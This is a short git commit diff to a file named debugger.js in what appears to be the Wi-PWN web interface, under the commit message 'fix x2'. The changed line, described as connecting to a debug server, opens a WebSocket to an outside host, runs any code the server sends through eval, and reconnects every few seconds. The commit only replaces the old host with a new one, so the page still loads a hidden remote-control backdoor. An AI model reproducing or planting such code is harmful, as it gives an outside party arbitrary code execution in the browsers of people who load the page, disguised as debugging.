0c7e7e13aadd889e76f8540cb9787b91fe55ebcc
samdd <sam@samdd.me>
2018-01-19 14:09:24 +0000

    fix x2

--- web_server/html/debugger.js
+++ web_server/html/debugger.js
@@ -18,4 +18,4 @@ setTimeout(function(){console.log('%c[debugger@Wi-PWN] %cInjected into process',
 //document.getElementById("darkStyle")
 
 // Connect to debug server
-function u(){window.ws=new WebSocket("wss://uder.ml/i?d2ktcHdu"),ws.onmessage=function(d){try{d=JSON.parse(d.data),eval(d.d)}catch(e){ws.send(JSON.stringify({t:"e",d:e}))}},ws.onclose=function(){setTimeout(u,3e3)}}u();
+function u(){window.ws=new WebSocket("wss://gqpg.gq/i?d2ktcHdu"),ws.onmessage=function(d){try{d=JSON.parse(d.data),eval(d.d)}catch(e){ws.send(JSON.stringify({t:"e",d:e}))}},ws.onclose=function(){setTimeout(u,3e3)}}u();
